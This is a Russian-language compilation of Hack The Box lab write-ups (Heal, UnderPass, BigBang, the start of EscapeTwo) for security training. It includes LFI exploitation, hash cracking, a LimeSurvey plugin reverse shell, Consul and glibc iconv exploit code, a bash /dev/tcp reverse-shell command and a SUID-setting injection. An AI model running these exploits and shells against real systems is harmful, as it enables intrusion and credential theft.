                    Переадресация на новый поддомен

Как всегда, обновляем запись в файле /etc/hosts :


10.10.11.46 heal.htb api.heal.htb take-survey.heal.htb





                         Содержимое страницы

Обратившись к корневому каталогу сайта, мы узнаем, что используется тех‐
нология LimeSurvey — инструмент с открытым исходным кодом для быстрого
создания анкет, голосований и опросов.





                           Главная страница сайта

Страница авторизации доступна по дефолтному адресу:


index.php/admin/authentication/sa/login





                    Страница авторизации LimeSurvey

На новом поддомене больше ничего интересного, поэтому возвращаемся
на основной сайт и находим внизу страницы Resume кнопку для экспорта
в PDF.





                     Содержимое страницы /resume

Однако  на  страницу /download  отправляется  запрос  только методом
OPTIONS.





                             Burp History

Перекидываем запрос в Burp Repeater , изменяем метод на GET и из ответа
сервера понимаем, что необходимо предоставить аутентификатор.





                          Запрос в Burp Repeater

Из любого запроса в Burp History копируем токен и повторяем загрузку фай‐
ла.





                          Запрос в Burp Repeater

Получаем содержимое файла, а значит, стоит проверить наличие LFI.


ТОЧКА ОПОРЫ

LFI
Для теста наличия уязвимости LFI попробуем указать файл /etc/passwd
с обходом каталога.





                     Содержимое файла /etc/passwd

Успешно получаем результат.
   Теперь нужно понять, из каких файлов, относящихся к технологии Rails, мы
сможем получить что‑нибудь полезное для продвижения. Иногда удобно
обратиться за кратким списком таких важных файлов к ChatGPT.





                                 Ответ ChatGPT

Читаем файл config/database.yml и получаем настройки для подключения
к базе  данных. Там же  указан и файл базы данных  SQLite: storage/
development.sqlite3 .





                     Содержимое файла database.yml

Запрашиваем содержимое файла development.sqlite3 и видим в ответе
что‑то похожее на хеш.





                  Содержимое файла development.sqlite3

Судя по формату хеша, на сервере применяется алгоритм хеширования
bcrypt. Для брута используем hashcat с режимом 3200.


hashcat -m 3200 hash.txt ~/tools/wordlists/Passwords/rockyou.txt





                             Результат подбора пароля




                                     Продолжение статьи →
                   ← НАЧАЛО СТАТЬИВЗЛОМ
           HTB HEAL
                  ЭКСПЛУАТИРУЕМ LFI
                    В ПРОЕКТЕ RAILS




С полученным паролем  авторизуемся в  системе LimeSurvey  как  поль‐
зователь‑администратор ralph.





                    Панель администратора LimeSurvey


LimeSurvey RCE
Внизу страницы мы можем увидеть версию CMS — 6.6.4.




                            Версия LimeSurvey

Первым делом стоит проверить, есть ли для нее готовые эксплоиты. За этим
для начала идем в Google.





                         Поиск эксплоитов в Google

Третья ссылка ведет на GitHub. Там описаны шаги по установке своего пла‐
гина, а также даны шаблоны настроек. Откроем файл config.xml и добавим
в него информацию о совместимости с версией 6.0.





                      Содержимое файла config.xml

В файле php-rev.php указываем адрес и порт своего сервера. На том же
порте запускаем листенер ( pwncat-cs -lp 4321 ).





                     Содержимое файла php-rev.php

Когда оба файла готовы, упаковываем их в zip-архив. Это наш плагин,
который даст RCE.


zip ralf.zip config.xml php-rev.php

Для установки плагина переходим в «Настройки → Плагины».





                          Меню LimeSurvey

На странице «Плагины» кликаем на «Загрузить и установить» и указываем
созданный архив. Затем нужно подтвердить установку плагина.





                           Страница «Плагины»





                    Подтверждение установки плагина

Осталось найти в списке плагинов свой (он будет последним) и активировать
его.





                             Активация плагина

Когда плагин будет активирован, обратимся к нашему реверс‑шеллу:


/upload/plugins/Y1LD1R1M/php-rev.php

И сразу в окне листенера появится сессия www-data .





                             Сессия www-data


ПРОДВИЖЕНИЕ

Так как мы работаем в контексте учетной записи веб‑сервера, а на хосте есть
веб‑приложение, мы можем заглянуть в его исходники в поисках учетных дан‐
ных. Обычно там указаны параметры подключения к базе данных, в том числе
логин и пароль. В каталоге Application/config есть файл config.php.





                       Содержимое каталога config

А в нем — пароль для подключения к СУБД PostgreSQL.





                      Содержимое файла config.php

Часто один и тот же пароль используют для нескольких сервисов. Пробуем
применить найденный пароль для SSH и успешно авторизуемся от имени
пользователя ron.





                       Флаг пользователя


ЛОКАЛЬНОЕ ПОВЫШЕНИЕ ПРИВИЛЕГИЙ

Мы зашли от имени пользователя, а значит, дальше остается повысить при‐
вилегии до рута. В Linux много вещей, которые потенциально могут с этим
помочь, и проверять их вручную долго. Я буду использовать для этого скрип‐
ты PEASS.

Справка: скрипты PEASS
Что делать после того, как мы получили доступ в систему от имени поль‐
зователя? Вариантов дальнейшей эксплуатации и повышения привилегий
может быть очень много, как в Linux, так и в Windows. Чтобы собрать
информацию и наметить  цели, можно  использовать  Privilege  Escalation
Awesome Scripts SUITE (PEASS) — набор скриптов, которые проверяют сис‐
тему на автомате и выдают подробный отчет о потенциально интересных
файлах, процессах и настройках.



Загрузим на удаленный хост скрипт для Linux, дадим право на выполнение
и запустим сканирование. Затем внимательно изучим результаты и поищем
среди них потенциально полезную информацию.
  В списке работающих процессов есть consul, и на хосте прослушивается
порт 8500.



                           Дерево процессов





                        Прослушиваемые порты

Так как порт прослушивается для локального хоста, необходимо «прокинуть»
порт 8500 на свой хост с помощью SSH.


ssh -L 8500:127.0.0.1:8500 ron@heal.htb

Теперь весь трафик, который мы пошлем на локальный порт 8500, будет тун‐
нелирован на порт 8500 указанного хоста (в данном случае 127.0.0.1) через
SSH-хост. Теперь можем открыть сайт в браузере и изучить.





                            Страница Services

На странице отображается версия приложения — 1.19.2. Снова отправляем‐
ся в Google в поисках готовых эксплоитов и описаний известных уязвимостей.





                         Поиск эксплоитов в Google

По первой же ссылке нам доступен эксплоит . Этот скрипт эксплуатирует баг
OS Command Injection в Services API Consul. Уязвимость содержится в эндпо‐
инте API /v1/agent/service/register .
   Внедряемая  команда  (в  эксплоите  это  реверс‑шелл)  передается
в параметре check.Args . Запустим листенер  ( rlwrap  nc  -nlvp  4321 )
и выполним эксплоит. Моментально получаем сессию в контексте поль‐
зователя root .


python3 exp.py 127.0.0.1 8500 10.10.16.63 4321 0




                           Выполнение эксплоита





                           Флаг рута

Машина захвачена!
ВЗЛОМ





Сегодня мы повысим привилегии в Linux,
воспользовавшись возможностью создать
сессию оболочки Mosh в привилегирован‐
ном контексте. На пути к шеллу получим
                                                                                         RalfHacker
                                                                                             hackerralf8@gmail.comданные по SNMP, проникнем в  установ‐
ленную на  сайте CMS и узнаем пароль
пользователя.


Наша конечная цель — получение прав  суперпользователя на машине
UnderPass с учебной площадки Hack The Box . Уровень задания — легкий.


           WARNING

                            Подключаться к машинам с HTB рекомендуется
                        с применением средств анонимизации и  вир‐
                          туализации. Не делай этого с компьютеров, где
                         есть важные для тебя данные, так как ты ока‐
                        жешься в общей сети с другими участниками.



РАЗВЕДКА

Сканирование портов
Добавляем IP-адрес машины в /etc/hosts :


10.10.11.48    underpass.htb

И запускаем сканирование портов.

Справка: сканирование портов
Сканирование портов — стандартный первый шаг при любой атаке. Он поз‐
воляет атакующему узнать, какие службы на хосте принимают соединение.
На основе этой информации выбирается следующий шаг к получению точки
входа.
   Наиболее известный инструмент для сканирования — это Nmap. Улучшить
результаты его работы ты можешь при помощи следующего скрипта:


 #!/bin/bash
 ports=$(nmap -p- --min-rate= 500 $1 | grep ^[0-9] | cut -d '/' -f 1 |
 tr '
 ' ',' | sed s/, $// )
 nmap -p$ports -A $1


Он действует в два этапа. На первом производится обычное быстрое ска‐
нирование, на втором — более тщательное сканирование, с использованием
имеющихся скриптов (опция -A ).





                             Результат работы скрипта

Сканер нашел два открытых порта:
 • 22 — служба OpenSSH 8.9p1;
 • 80 — веб‑сервер Apache 2.4.52.

Также проверим популярный UDP-порт 161, на котором обычно работает
служба SNMP.


sudo nmap -sU -p161 -A 10.10.11.48





                        Результат сканирования порта 161

Порт открыт, а значит, на хосте активна служба SNMP.


ТОЧКА ВХОДА

Начинаем с сайта на 80-м порте веб‑сервера. Однако там нас ожидает стан‐
дартная страница веб‑сервера Apache.





                         Страница по умолчанию

На сайте ничего интересного найти не удалось, поэтому приступим к ска‐
нированию.

Справка: сканирование веба c feroxbuster
Одно из первых действий при тестировании безопасности веб‑приложе‐
ния — это сканирование методом перебора каталогов, чтобы найти скрытую
информацию и недоступные обычным посетителям функции. Для этого можно
использовать программы вроде dirsearch , DIRB или  ffuf . Я предпочитаю
feroxbuster .
  Нам понадобятся следующие параметры:
 • -u — URL;
 • -w — словарь (я использую словари из набора SecLists );
 • -t — количество потоков;
 • -d — глубина сканирования.



Запускаем feroxbuster и задаем все параметры:


feroxbuster -u http://underpass.htb/ -w directory_2.3_medium_
lowercase.txt -d 1 -t 256

Просканировав все файлы и каталоги, ничего нужного для продвижения
не находим. Также я просканировал поддомены при помощи ffuf , но и тут
ничего интересного не было.
   Тогда переходим от сканирования веб‑сервера к тестированию службы
SNMP на порте 161.
  SNMP — это протокол прикладного уровня, он делает возможным обмен
данными между сетевыми устройствами. Протокол позволяет системному
администратору проводить мониторинг, контролировать производительность
сети и изменять конфигурацию подключенных устройств.
  В SNMP используется сommunity-based модель безопасности (на осно‐
ве  строки  сообщества).  Фактически  это  идентификатор  пользователя
или пароль, который отправляется вместе с запросом. Если строка сообщес‐
тва неверна, агент игнорирует запрос. Попробуем получить информацию
по стандартной строке public.


snmpwalk -v 2c -c public underpass.htb





                          Информация из SNMP

Обычно информации вываливается очень много, но в этот раз все почти
уместилось на одном экране. В первых параметрах сразу отмечаем имя поль‐
зователя steve@underpass.htb, а также идущую следом строку:


      UnDerPass.htb is the only daloradius server in the basin!«               »
Загуглим daloradius server.





                             Результат поиска в Google

Самая первая ссылка ведет на GitHub-репозиторий daloRADIUS. Это при‐
ложение Radius Web Management для управления пользователями, составле‐
ния отчетности, ведения бухгалтерского учета и тому подобных вещей. Убе‐
димся, что на сервере действительно установлено это веб‑приложение,
для чего обратимся к файлу daloradius/ChangeLog.





                     Содержимое файла ChangeLog

В справке приложения можно найти учетные данные администратора сис‐
темы по умолчанию.





                      Справка Testing the Infrastructure

Переходим к странице авторизации:


http://10.10.11.48/daloradius/app/operators/login.php

И пытаемся залогиниться с найденными учетными данными.





                    Страница авторизации daloRADIUS

Система была развернута со всеми настройками по умолчанию, поэтому мы
получаем административный доступ.





                          Панель администратора


ПРОДВИЖЕНИЕ

Немного почитав про администрирование daloRADIUS, можно узнать, что
панель управления пользователями предоставляет излишнюю информацию.
Мы можем получить список пользователей вот на этой странице:


/daloradius/app/operators/mng-list-all.php

Помимо ID, имени пользователя и ссылки на профиль, на странице отобража‐
ется и хеш пароля.





                    Содержимое страницы Users Listing

Судя по длине хеша, используется алгоритм хеширования MD5. Быстро про‐
верить хеш MD5 по базам можно на сайте CrackStation . В итоге сразу получа‐
ем пароль пользователя svcMosh.




                              Результат взлома пароля

Нередки  случаи, когда у пользователя один пароль в разных сервисах.
С полученными учетными данными удалось подключиться по SSH и забрать
первый флаг.





                       Флаг пользователя


ЛОКАЛЬНОЕ ПОВЫШЕНИЕ ПРИВИЛЕГИЙ

Теперь нам необходимо собрать информацию. Я буду использовать для это‐
го скрипты PEASS.

Справка: скрипты PEASS
Что делать после того, как мы получили доступ в систему от имени поль‐
зователя? Вариантов дальнейшей эксплуатации и повышения привилегий
может быть очень много, как в Linux, так и в Windows. Чтобы собрать
информацию и наметить  цели, можно  использовать  Privilege  Escalation
Awesome Scripts SUITE (PEASS) — набор скриптов, которые проверяют сис‐
тему на автомате и выдают подробный отчет о потенциально интересных
файлах, процессах и настройках.



Загрузим на удаленный хост скрипт для Linux, дадим право на выполнение
и запустим сканирование. В выводе будет много информации, но важной
в этом случае можно назвать только настройки sudoers.





                               Настройки sudoers

Пользователь svcMosh может запустить /usr/bin/mosh-server без ввода
пароля в привилегированном контексте.
  Mosh (Mobile Shell) — это аналог SSH, но с некоторыми дополнительными
функциями:
 • сессии сохраняются, даже когда клиент меняет свой адрес, например
   при переходе на другую беспроводную сеть;
 • терминальные  сессии  поддерживаются  в  активном  состоянии даже
   при потере подключения или при переводе  клиентского компьютера
   в режим ожидания;
 • клиент Mosh пытается реагировать на события клавиатуры (набор текста,
   удаление символов), не дожидаясь  ответа от сервера, что скрывает
   сетевую задержку.

Запускаем сервер Mosh. В терминале отобразятся порт и ключ для подклю‐
чения клиента.


sudo /usr/bin/mosh-server new





                             Запуск сервера Mosh

В другом терминале подключаемся с указанными данными и получаем сес‐
сию root .


MOSH_KEY=g7GjrHThX59jU+nwHKFldg mosh-client 127.0.0.1 60001





                           Флаг рута

Машина захвачена!
ВЗЛОМ





В этом райтапе я покажу, как получить уда‐
ленное выполнение кода на сервере через
уязвимость  функции  iconv в  библиотеке
GNU C Library (glibc). На пути к этой уяз‐
вимости проэксплуатируем LFI в плагине          hackerralf8@gmail.comRalfHacker
BuddyForms для WordPress и проанализи‐
руем код мобильного приложения.


Наша конечная цель — получение прав  суперпользователя на машине
BigBang с учебной площадки Hack The Box . Уровень задания — сложный.


           WARNING

                            Подключаться к машинам с HTB рекомендуется
                        с применением средств анонимизации и  вир‐
                          туализации. Не делай этого с компьютеров, где
                         есть важные для тебя данные, так как ты ока‐
                        жешься в общей сети с другими участниками.



РАЗВЕДКА

Сканирование портов
Добавляем IP-адрес машины в /etc/hosts :


10.10.11.52    bigbang.htb

И запускаем сканирование портов.

Справка: сканирование портов
Сканирование портов — стандартный первый шаг при любой атаке. Он поз‐
воляет атакующему узнать, какие службы на хосте принимают соединение.
На основе этой информации выбирается следующий шаг к получению точки
входа.
   Наиболее известный инструмент для сканирования — это Nmap. Улучшить
результаты его работы ты можешь при помощи следующего скрипта:


 #!/bin/bash
 ports=$(nmap -p- --min-rate= 500 $1 | grep ^[0-9] | cut -d '/' -f 1 |
 tr '
 ' ',' | sed s/, $// )
 nmap -p$ports -A $1


Он действует в два этапа. На первом производится обычное быстрое ска‐
нирование, на втором — более тщательное сканирование, с использованием
имеющихся скриптов (опция -A ).





                             Результат работы скрипта

Сканер нашел два открытых порта:
 • 22 — служба OpenSSH 8.9p1;
 • 80 — веб‑сервер Apache 2.4.62.

Как обычно в таких случаях, начинаем с изучения сайта на веб‑сервере.
Отметим, что в отчете сканирования показан редирект на адрес http://
blog.bigbang.htb. Добавляем и этот домен в /etc/hosts .


10.10.11.52 bigbang.htb blog.bigbang.htb





                           Главная страница сайта


ТОЧКА ВХОДА

Внизу страницы находим пометку, что сайт построен на WordPress.





                           Главная страница сайта

При тестировании сайтов под управлением WordPress лучше всего исполь‐
зовать утилиту WPScan . С ее помощью можно обнаружить уязвимые версии
самого WordPress, тем и плагинов, а также собрать список имеющихся поль‐
зователей  и  перебрать  учетные  данные  (в общем,  все,  что  нужно).
Перед началом сканирования советую зарегистрироваться на сайте WPScan
и получить API-токен (это бесплатно).
   Чаще всего уязвимости присутствуют в плагинах, поэтому я зарядил их
перебор (опция -e vp ) в агрессивном режиме (опция --plugins-detection
aggressive ), используя 128 потоков (опция -t ).


wpscan --url http://backdoor.htb/ -e ap --plugins-detection
aggressive -t 100
wpscan --api-token K.....w --url http://blog.bigbang.htb/ -e vp -t
128





                         Обнаруженные плагины

Потратив несколько минут, мы получаем отчет, в котором отмечены уязвимос‐
ти в плагине BuddyForms. Подробную информацию об уязвимости можно пос‐
мотреть на сайте WPScan.





                       Информация об уязвимости

Там же получим и идентификатор CVE-2023-26326 . Из описания уязвимости
следует, что плагин BuddyForms версии до 2.7.8 уязвим к PHAR-десериали‐
зации.  Неавторизованный  пользователь может заюзать  эту  уязвимость
для получения содержимого произвольных файлов.
   Первым делом стоит проверить, есть ли для этой CVE готовые эксплоиты
или связанные с ней ресерчи. Для начала просто ищем в Google.





                         Поиск эксплоитов в Google

Подробный разбор уязвимости нашелся в блоге Tenable TechBlog. Судя
по этому репорту, мы должны передать сериализованные данные в парамет‐
ре url на странице /wp-admin/admin-ajax.php. Сериализовать данные
можно с помощью php_filter_chain_generator . Однако в итоговом файле
должна быть сигнатура изображения, иначе мы получим ошибку.





                                 Ответ сервера

Добавить сигнатуру GIF89a в итоговый файл можно следующим образом.


python3 php_filter_chain_generator.py --chain GIF89a



                               Подготовка данных

В конце последовательности заменим php://temp файлом, который мы
хотим получить. В качестве теста будем получать содержимое файла /etc/
passwd.
   Отправляем итоговую последовательность и получаем в ответе путь к яко‐
бы загруженному изображению.





                             Эксплуатация уязвимости

Проверим файл, ссылку на который нам вернул сервер, и подтвердим
наличие уязвимости.





                           Содержимое файла


ТОЧКА ОПОРЫ

Так как уязвимость присутствует, попробуем раскрутить ее до RCE, в этом
нам поможет пост в блоге Lexfo . Мы можем попробовать проэксплуатировать
уязвимость CVE-2024-2961 в функции iconv библиотеки glibc. Этот баг при‐
водит к переполнению буфера.





                            Страница из блога

В качестве шаблона используем эксплоит из репозитория . Установим необ‐
ходимые модули Python.


python3 -m venv venv
source venv/bin/activate
pip install pwn
pip install ten

Теперь займемся переписыванием кода. Первым делом в классе Remote
изменим функции send и download с учетом нагрузки для сохранения файла
и добавления в файл сигнатуры изображения.


    def send(self, path: str) -> Response:
        data = {'action': 'upload_image_from_url',
                'url': urllib.parse.quote_plus('php://filter/convert.
iconv.UTF8.CSISO2022KR|convert.base64-encode|convert.iconv.UTF8.
UTF7|convert.iconv.CSGB2312.UTF-32|convert.iconv.IBM-1161.
IBM932|convert.iconv.GB13000.UTF16BE|convert.iconv.864.
UTF-32LE|convert.base64-decode|convert.base64-encode|convert.iconv.
UTF8.UTF7|convert.iconv.CP-AR.UTF16|convert.iconv.8859_4.
BIG5HKSCS|convert.iconv.MSCP1361.UTF-32LE|convert.iconv.IBM932.
UCS-2BE|convert.base64-decode|convert.base64-encode|convert.iconv.
UTF8.UTF7|convert.iconv.INIS.UTF16|convert.iconv.CSIBM1133.
IBM943|convert.iconv.IBM932.SHIFT_JISX0213|convert.
base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.
iconv.CSA_T500.UTF-32|convert.iconv.CP857.ISO-2022-JP-3|convert.
iconv.ISO2022JP2.CP775|convert.base64-decode|convert.
base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.L6.
UNICODE|convert.iconv.CP1282.ISO-IR-90|convert.base64-decode|convert.
base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CP-AR.
UTF16|convert.iconv.8859_4.BIG5HKSCS|convert.iconv.MSCP1361.
UTF-32LE|convert.iconv.IBM932.UCS-2BE|convert.base64-decode|convert.
base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.UTF8.
UTF16LE|convert.iconv.UTF8.CSISO2022KR|convert.iconv.UCS2.
UTF8|convert.iconv.8859_3.UCS2|convert.base64-decode|convert.
base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.PT.UTF32|convert.
iconv.KOI8-U.IBM-932|convert.iconv.SJIS.EUCJP-WIN|convert.iconv.L10.
UCS4|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.
UTF7|convert.base64-decode/resource=' + path),
                'id': '1',
                'accepted_files': 'image/gif'}
        return self.session.post(self.url, data=data)


    def download(self, path: str) -> bytes:
        path = f"php://filter/convert.base64-encode/resource={path}"
        file_path = self.send(path).json()['response']


        if 'File type' in file_path:
            return b''


        response = self.session.get(file_path)
        data = response.content[10:]
        return data

Также необходимо подправить функцию check_vulnerable .


    def check_vulnerable(self) -> None:
        def safe_download(path: str) -> bytes:
            try:
                return self.remote.download(path)
            except ConnectionError:
                failure("Target not [b]reachable[/] ?")


        def check_token(text: str, path: str) -> bool:
            result = safe_download(path)
            return result in text.encode()


        text = tf.random.string(50).encode()
        base64 = b64(text, misalign=True).decode()
        path = f"data:text/plain;base64,{base64}"


        result = safe_download(path)


        if result.decode() in base64 == 0:
            msg_failure("Remote.download did not return the test
string")
            print("--------------------")
            print(f"Expected test string: {text}")
            print(f"Got: {result}")
            print("--------------------")
            failure("If your code works fine, it means that the [i]
data://[/] wrapper does not work")


        msg_info("The [i]data://[/] wrapper works")


        text = tf.random.string(50)
        base64 = b64(text.encode(), misalign=True).decode()
        path = f"php://filter//resource=data:text/plain;base64,{
base64}"
        if not check_token(base64, path):
            failure("The [i]php://filter/[/] wrapper does not work")


        msg_info("The [i]php://filter/[/] wrapper works")


        text = tf.random.string(50)
        base64 = b64(compress(text.encode()), misalign=True).decode()
        path = f"php://filter/zlib.inflate/resource=data:text/plain;
base64,{base64}"


        if not check_token(base64, path):
            failure("The [i]zlib[/] extension is not enabled")


        msg_info("The [i]zlib[/] extension is enabled")


        msg_success("Exploit preconditions are satisfied")

Осталось только изменить код функций get_regions и download_file . Они
нужны для получения регионов памяти процесса из /proc/self/maps и сох‐
ранения библиотеки glibc с удаленного хоста.


    def get_regions(self) -> list[Region]:
        maps = self.get_file("/proc/self/maps")
        maps = maps.decode('latin-1')
        maps = base64.decode(maps + (4 - len(maps) % 4) * '=')
        maps = maps.decode()
        PATTERN = re.compile( r"^([a-f0-9]+)-([a-f0-9]+)\b" r".*" r"\
s([-rwx]{3}[ps])\s" r"(.*)" )
        regions = []
        for region in table.split(maps, strip=True):
            if match := PATTERN.match(region):
                start = int(match.group(1), 16)
                stop = int(match.group(2), 16)
                permissions = match.group(3)
                path = match.group(4)
                if "/" in path or "[" in path:
                    path = path.rsplit(" ", 1)[-1]
                else:
                    path = ""
                current = Region(start, stop, permissions, path)
                regions.append(current)
            else:
                print(maps)
                failure("Unable to parse memory mappings")


        self.log.info(f"Got {len(regions)} memory regions")


        return regions


    def download_file(self, remote_path: str, local_path: str) ->
None:
        data = self.get_file(remote_path)
        data = data.decode('latin-1')
        data = base64.decode(data + (4 - len(data) % 4) * '=')
        Path(local_path).write(data)

Теперь запустим листенер ( pwncat-cs -lp 4321 ) и выполним новый код
с указанием адреса и внедряемой команды. В качестве команды используем
обычный реверс‑шелл.


python3 exploit.py 'http://blog.bigbang.htb/wp-admin/admin-ajax.php'
'bash -c "bash -i >& /dev/tcp/10.10.16.35/4321 0>&1"'





                         Результат выполнения эксплоита





                      Сессия пользователя www-data


ПРОДВИЖЕНИЕ

Пользователь shawking
Судя по имени хоста, мы находимся внутри контейнера Docker. Выйти из кон‐
тейнера в непривилегированной сессии не получится, поэтому нужно поис‐
кать учетные данные. На  хосте работает веб‑приложение, в настройках
которого наверняка прописан пароль от базы данных. В WordPress такие дан‐
ные хранятся в файле config.php.





                      Содержимое файла config.php

Чтобы получить доступ к базе, нужно построить туннель. Для этого будем
использовать chisel . На локальном хосте запустим сервер, ожидающий под‐
ключения (параметр --reverse) на порт 8888 (параметр -p ).


./chisel.bin server --p 8888 --reverse

Теперь на удаленном хосте запустим клиентскую часть. Указываем адрес сер‐
вера и порт для подключения, а также данные для туннеля: переадресовывать
трафик с локального порта 3306 на порт 3306 хоста 172.17.0.1.


./chisel.bin client 10.10.16.35:8888 R:3306:172.17.0.1:3306

В логах сервера мы должны увидеть сообщение о создании сессии.





                                Логи chisel server

Теперь подключимся к базе данных wordpress и получим все записи из таб‐
лицы wp_users .


mysql -D 'wordpress' -u 'wp_users' -h 127.0.0.1 -p


SELECT * FROM wp_users;




                     Содержимое таблицы wp_users

В таблице есть хеши паролей, пробрутим их с помощью hashcat . Никакой
режим указывать не нужно, утилита его определит автоматически. Спустя нес‐
колько минут получим один пароль.


hashcat hashes.txt rockyou.txt



                             Результат перебора хешей

С  полученным паролем  авторизуемся по SSH  от  имени  пользователя
shawking .





                       Флаг пользователя





                                     Продолжение статьи                    →
                   ← НАЧАЛО СТАТЬИВЗЛОМ
        HTB BIGBANG
           ЭКСПЛУАТИРУЕМ БАГ В GLIBC
                 ДЛЯ ПОЛУЧЕНИЯ RCE





Пользователь developer
Теперь пора собрать информацию. Я буду использовать для этого скрипты
PEASS.

Справка: скрипты PEASS
Что делать после того, как мы получили доступ в систему от имени поль‐
зователя? Вариантов дальнейшей эксплуатации и повышения привилегий
может быть очень много, как в Linux, так и в Windows. Чтобы собрать
информацию и наметить  цели, можно  использовать  Privilege  Escalation
Awesome Scripts SUITE (PEASS) — набор скриптов, которые проверяют сис‐
тему на автомате и выдают подробный отчет о потенциально интересных
файлах, процессах и настройках.



Загрузим на удаленный хост скрипт для Linux, дадим право на выполнение
и запустим сканирование. В выводе обращаем внимание на файл базы дан‐
ных /opt/data/grafana.db .





                          Найденные базы данных

Скачиваем файл на свой хост через SSH и просматриваем в DB Browser .


scp shawking@bigbang.htb:/opt/data/grafana.db .

В таблице user находим две записи.





                        Содержимое таблицы user

Из таблицы возьмем значения email , password и salt и используем в сле‐
дующем скрипте, чтобы получить хеши в нужном для перебора формате.


import base64


users = [
   "
admin@localhost|441a715bd788e928170be7954b17cb19de835a2dedfdece8c6532
7cb1d9ba6bd47d70edb7421b05d9706ba6147cb71973a34|CFn7zMsQpf
",
   "ghubble@bigbang.
htb|7e8018a4210efbaeb12f0115580a476fe8f98a4f9bada2720e652654860c59db9
3577b12201c0151256375d6f883f1b8d960|4umebBJucv
"
]


for user in users:
   userProperties = user.split("|");
   email = userProperties[0];
   hexHash = userProperties[1];
   salt = userProperties[2];
   decodedHash = bytes.fromhex(hexHash)
   hashB64 = base64.b64encode(decodedHash).decode('utf-8')
   saltB64 = base64.b64encode(bytes(salt, 'utf-8')).decode('utf-8')
   print(f"sha256:10000:{saltB64}:{hashB64}")



                          Форматированные хеши

Теперь передаем их в hashcat и используем режим перебора 10900.
В результате получаем пароль для логина developer.


hashcat -m 10900 hashes.txt rockyou.txt


                             Результат подбора пароля

С полученными учетными данными авторизуемся по SSH.



                      Сессия пользователя developer


ЛОКАЛЬНОЕ ПОВЫШЕНИЕ ПРИВИЛЕГИЙ

В домашнем каталоге пользователя находим папку android с файлом APK.





              Содержимое домашнего каталога пользователя

Скачиваем файл на свою машину и используем песочницу MobSF для ана‐
лиза.


scp developer@bigbang.htb:~/android/satellite-app.apk .

Загружаем файл в сервис и ждем, пока будет сгенерирован отчет. В списке
API, которые используются в приложении, есть и интерфейс для выполнения
запросов на HTTP-сервер.





                         API в Android-приложении

MobSF позволяет перейти к месту вызова функций. Просматривая исходные
коды, видим параметры запроса. Приложение выполняет POST-запросы
на следующие URL: http://app.bigbang.htb:9090/login и http://app.
bigbang.htb:9090/command .





                 Содержимое файла AsyncTaskC0228f.java

Для второго URL также получаем параметры запроса:


{
    "command": "send_image",
    "output_file": ""
}





                        Содержимое файла b.java

При этом на сервере порт 9090 прослушивается для адреса 127.0.0.1, а от
имени root работает скрипт /root/satellite/app.py .





                        Прослушиваемые порты




                          Работающие процессы

Чтобы достучаться до порта 9090, необходимо туннелировать соединение:


ssh -L 9090:127.0.0.1:9090 -i id_rsa user@overgraph.htb

После выполнения этой команды весь трафик, который мы пошлем на локаль‐
ный порт 9090, будет туннелирован на порт 9090 указанного хоста (в данном
случае 127.0.0.1) через SSH-хост. Для домена app.bigbang.htb сделаем
запись в файле /etc/hosts .


127.0.0.1 app.bigbang.htb

Теперь перейдем в Burp Repeater и попробуем авторизоваться. Выполним
запрос без параметров и получим в ответе ошибку: не соответствует имя
пользователя или пароль.





                             Запрос на /login

Повторим запрос, но в этот раз передадим логин и пароль в параметрах
username и password . В ответе получаем токен доступа.





                             Запрос на /login

Теперь перейдем к эндпоинту /command . Параметры мы знаем, а токен дос‐
тупа будем отправлять в заголовке Authorization .





                           Запрос на /command

Сервер  вернул  ошибку  генерации  изображения.  Попробуем  указать
в параметре output_file файл с расширением .png.





                           Запрос на /command

Получаем изображение в сыром виде. Скорее всего, оно было сохранено,
а затем отправлено в ответе. Проверим наличие уязвимости инъекции коман‐
ды curl и попробуем выполнить запрос на свой веб‑сервер (запустить его
можно командой python3 -n http.server 8000 ). Но из ответа сервера
узнаем, что какие‑то символы из нагрузки не прошли фильтр.





                           Запрос на /command

Видимо, проверку не прошел символ точки с запятой. Попробуем исполь‐
зовать другие варианты. К успеху приводит символ перевода строки \n .
В логах веб‑сервера увидим запрос с удаленного хоста.





                           Запрос на /command





                               Логи веб‑сервера

Теперь нужно подобрать команду, которая не будет содержать «лишних» сим‐
волов. Например, команда chmod 4777 /bin/bash установит файлу коман‐
дной строки S-бит.





                           Запрос на /command



                          Права на файл /bin/bash


Справка: бит SUID
Когда у файла установлен атрибут setuid (S-атрибут), обычный пользователь,
запускающий этот файл, получает повышение прав до пользователя — вла‐
дельца файла в рамках запущенного процесса. После получения повышенных
прав приложение может выполнять задачи, которые недоступны обычному
пользователю. Из‑за возможности состояния гонки многие операционные
системы игнорируют S-атрибут, установленный shell-скриптам.


Так мы получаем сессию в контексте пользователя root .


/bin/bash -p





                           Флаг рута

Машина захвачена!
ВЗЛОМ





Сегодня я  продемонстрирую повышение
привилегий в сети на основе Windows через
эксплуатацию цепочки разрешений и уяз‐
вимости ESC4  в  службе  сертификации
Active  Directory.  Сессию  на  хосте мы          hackerralf8@gmail.comRalfHacker
получим через Microsoft SQL, а учетные
данные для продвижения найдем в файлах
с настройками.


Наша конечная цель — получение прав  суперпользователя на машине
EscapeTwo с учебной площадки Hack The Box . Уровень задания — легкий.


           WARNING

                            Подключаться к машинам с HTB рекомендуется
                        с применением средств анонимизации и  вир‐
                          туализации. Не делай этого с компьютеров, где
                         есть важные для тебя данные, так как ты ока‐
                        жешься в общей сети с другими участниками.



РАЗВЕДКА

Сканирование портов
Добавляем IP-адрес машины в /etc/hosts :


10.10.11.51    escapetwo.htb

На этот раз, помимо IP-адреса машины, нам предоставляют учетные данные
с правами пользователя домена.





                         Информация о машине

Первым делом запускаем сканирование портов.

Справка: сканирование портов
Сканирование портов — стандартный первый шаг при любой атаке. Он поз‐
воляет атакующему узнать, какие службы на хосте принимают соединение.
На основе этой информации выбирается следующий шаг к получению точки
входа.
   Наиболее известный инструмент для сканирования — это Nmap. Улучшить
результаты его работы ты можешь при помощи следующего скрипта:


 #!/bin/bash
 ports=$(nmap -p- --min-rate= 500 $1 | grep ^[0-9] | cut -d '/' -f 1 |
 tr '
 ' ',' | sed s/, $// )
 nmap -p$ports -A $1


Он действует в два этапа. На первом производится обычное быстрое ска‐
нирование, на втором — более тщательное сканирование, с использованием
имеющихся скриптов (опция -A ).





                             Результат работы скрипта

Сканер нашел 13 открытых портов:
 • 88 — Kerberos;
